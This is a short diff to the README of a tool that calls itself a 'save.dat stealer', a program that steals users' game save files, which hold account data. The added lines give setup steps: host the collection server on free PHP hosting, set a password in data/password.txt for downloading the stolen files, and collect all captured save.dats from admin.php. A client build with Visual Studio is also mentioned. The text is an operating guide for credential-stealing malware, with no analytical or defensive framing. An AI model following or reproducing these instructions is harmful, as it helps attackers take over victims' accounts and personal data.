@@ -5,6 +5,8 @@ This is save.dat stealer. This stealer request any server with PHP support. Also
 # How to setup server
  - 1.) Make account on free php hosting
  - 2.) Upload files from folder server there.
+ - 3.) Change password for downloading save.dats in data/password.txt
+ - 4.) Get all save.dats from admin.php
 
 # How to setup client
  - 1.) Install visual studio 2013 or newer
